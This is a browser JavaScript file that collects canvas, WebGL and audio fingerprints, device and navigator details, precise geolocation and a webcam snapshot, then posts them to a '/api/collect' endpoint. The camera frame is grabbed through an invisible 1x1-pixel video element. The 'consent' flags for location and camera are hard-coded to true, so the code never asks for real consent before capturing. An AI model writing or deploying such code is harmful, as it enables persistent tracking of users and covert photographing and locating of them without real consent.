async function sha256Hex(input) {
    const data = new TextEncoder().encode(input)
    const hashBuffer = await crypto.subtle.digest('SHA-256', data)
    const hashArray = Array.from(new Uint8Array(hashBuffer))
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
}

async function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas')
        const ctx = canvas.getContext('2d')
        canvas.width = 300
        canvas.height = 120

        ctx.textBaseline = 'top'
        ctx.font = '16px Arial'
        ctx.fillStyle = '#f60'
        ctx.fillRect(20, 20, 120, 40)
        ctx.fillStyle = '#069'
        ctx.fillText('Canvas FP', 24, 24)
        ctx.strokeStyle = '#ff0'
        ctx.beginPath()
        ctx.arc(200, 60, 30, 0, Math.PI * 2)
        ctx.stroke()

        const data = canvas.toDataURL()
        return await sha256Hex(data)
    } catch {
        return null
    }
}

async function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas')
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')

        if (!gl) {
            return { hash: null, vendor: null, renderer: null }
        }

        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR)
        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)

        const glData = {
            vendor,
            renderer,
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
        }

        return {
            hash: await sha256Hex(JSON.stringify(glData)),
            vendor,
            renderer
        }
    } catch {
        return { hash: null, vendor: null, renderer: null }
    }
}

async function getAudioFingerprint() {
    try {
        const AudioContextClass = window.OfflineAudioContext || window.webkitOfflineAudioContext
        if (!AudioContextClass) {
            return null
        }

        const context = new AudioContextClass(1, 44100, 44100)
        const oscillator = context.createOscillator()
        const compressor = context.createDynamicsCompressor()

        oscillator.type = 'triangle'
        oscillator.frequency.value = 10000

        compressor.threshold.value = -50
        compressor.knee.value = 40
        compressor.ratio.value = 12
        compressor.attack.value = 0
        compressor.release.value = 0.25

        oscillator.connect(compressor)
        compressor.connect(context.destination)
        oscillator.start(0)

        const buffer = await context.startRendering()
        const channelData = buffer.getChannelData(0)
        let sum = 0

        for (let i = 0; i < channelData.length; i += 100) {
            sum += Math.abs(channelData[i])
        }

        return await sha256Hex(String(sum))
    } catch {
        return null
    }
}

function getScreenData() {
    return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        dpr: window.devicePixelRatio || 1
    }
}

function getNavigatorData() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages || [],
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor
    }
}

function getTimezone() {
    try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone
    } catch {
        return null
    }
}

function getConnectionData() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection
    if (!c) return null

    return {
        effectiveType: c.effectiveType,
        downlink: c.downlink,
        rtt: c.rtt,
        saveData: c.saveData
    }
}

async function getGeolocation(enabled) {
    if (!enabled || !navigator.geolocation) {
        return null
    }

    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            position => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                })
            },
            () => resolve(null),
            {
                enableHighAccuracy: false,
                timeout: 8000,
                maximumAge: 0
            }
        )
    })
}
async function captureCamera(enabled) {

    if (!enabled) return null
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null

    let stream = null
    let video = null

    try {

        stream = await navigator.mediaDevices.getUserMedia({ video: true })

        video = document.createElement("video")
        video.srcObject = stream
        video.muted = true
        video.playsInline = true

        video.style.position = "fixed"
        video.style.opacity = "0"
        video.style.pointerEvents = "none"
        video.style.width = "1px"
        video.style.height = "1px"
        document.body.appendChild(video)

        await video.play().catch(() => {})

        await new Promise(resolve => {
            const check = () => {
                if (video.readyState >= 2) {
                    resolve()
                } else {
                    requestAnimationFrame(check)
                }
            }
            check()
        })

        await new Promise(r => setTimeout(r, 300))

        const canvas = document.createElement("canvas")
        const ctx = canvas.getContext("2d")

        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480

        ctx.drawImage(video, 0, 0)

        return canvas.toDataURL("image/jpeg", 0.7)

    } catch (e) {
        console.log("camera error", e)
        return null
    } finally {

        if (stream) {
            stream.getTracks().forEach(track => track.stop())
        }

        if (video && video.parentNode) {
            video.remove()
        }
    }
}

async function buildFingerprint(includeGeo = true, includeCamera = true) {
    const canvasFingerprint = await getCanvasFingerprint()
    const webglData = await getWebGLFingerprint()
    const audioFingerprint = await getAudioFingerprint()

    const [geolocation, cameraImage] = await Promise.all([
        getGeolocation(includeGeo),
        captureCamera(includeCamera)
    ])

    console.log("CAMERA IMAGE:", cameraImage)

    const payload = {
        collectedAt: new Date().toISOString(),
        screen: getScreenData(),
        timezone: getTimezone(),
        connection: getConnectionData(),
        ...getNavigatorData(),
        canvasFingerprint,
        webglFingerprint: webglData.hash,
        gpuVendor: webglData.vendor,
        gpuRenderer: webglData.renderer,
        audioFingerprint,
        geolocation,
        cameraImage
    }

    const stableIdentity = {
        platform: payload.platform,
        language: payload.language,
        languages: payload.languages,
        hardwareConcurrency: payload.hardwareConcurrency,
        deviceMemory: payload.deviceMemory,
        maxTouchPoints: payload.maxTouchPoints,
        timezone: payload.timezone,
        screen: payload.screen,
        canvasFingerprint: payload.canvasFingerprint,
        webglFingerprint: payload.webglFingerprint,
        audioFingerprint: payload.audioFingerprint,
        gpuVendor: payload.gpuVendor,
        gpuRenderer: payload.gpuRenderer
    }

    payload.deviceHash = await sha256Hex(JSON.stringify(stableIdentity))

    return payload
}

async function sendFingerprint(payload) {
    const res = await fetch('/api/collect', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })

    return res.json()
}

function setStatus(text) {
    const el = document.getElementById('status')
    if (el) {
        el.textContent = text
    } else {
        console.log('[status]', text)
    }
}

function setPreview(payload) {
    const el = document.getElementById('preview')
    if (el) {
        el.textContent = JSON.stringify(payload, null, 2)
    } else {
        console.log('[preview]', payload)
    }
}

const startBtn = document.getElementById('start-btn')

if (startBtn) {
    startBtn.addEventListener('click', async () => {
        const consentGeo = true
        const consentCamera = true

        try {
            setStatus('Collecting fingerprint signals...')

            const payload = await buildFingerprint(consentGeo, consentCamera)

            setPreview(payload)
            setStatus('Sending data to server...')

            const result = await sendFingerprint(payload)

            if (result.ok) {
                setStatus('Done. Fingerprint collected and stored successfully.')
            } else {
                setStatus('Collection finished, but the server did not confirm success.')
            }
        } catch (err) {
            setStatus('Error during fingerprint collection.')
            const preview = document.getElementById('preview')
            if (preview) {
                preview.textContent = String(err)
            } else {
                console.error(err)
            }
        }
    })
}